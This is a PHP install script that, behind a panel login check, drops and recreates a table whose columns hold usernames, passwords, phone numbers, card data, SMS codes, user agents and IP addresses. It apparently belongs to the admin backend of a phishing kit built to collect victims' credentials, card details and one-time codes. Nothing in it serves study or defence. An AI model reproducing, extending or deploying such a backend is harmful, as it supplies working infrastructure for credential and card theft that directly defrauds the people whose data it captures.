<?php
include './config/config.php';
include './config/db.class.php';
include './config/Panel.php';
include './config/User.php';
$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);

if (!Panel::LoggedIn()) Panel::redirectToLogin();
try {
  $result = $db->insert("DROP TABLE IF EXISTS ".$userclass->getTable()."");
  $result = $db->insert("CREATE TABLE IF NOT EXISTS ".$userclass->getTable()." (
  id int(10) NOT NULL AUTO_INCREMENT,
  site_id      varchar(255) NOT NULL,
  user         varchar(255) DEFAULT NULL,
  pass         varchar(255) DEFAULT NULL,
  phone        varchar(255) DEFAULT NULL,
  linksms       varchar(255) DEFAULT NULL,
  firma        varchar(255) DEFAULT NULL,
  cards        varchar(255) DEFAULT NULL,
  sms          varchar(255) DEFAULT NULL,
  ua varchar(1000) DEFAULT NULL,
  ip varchar(255) DEFAULT NULL,
  time varchar(255) DEFAULT NULL,
  updatetime varchar(255) DEFAULT NULL,
  status int(10) DEFAULT NULL,
  CONSTRAINT pk_login PRIMARY KEY(id)
)ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1;");

}
catch(Exception $e) {
  echo 'Some error occured';
  die();
}
echo "Database Refreshed/Installed Successfully";
?>


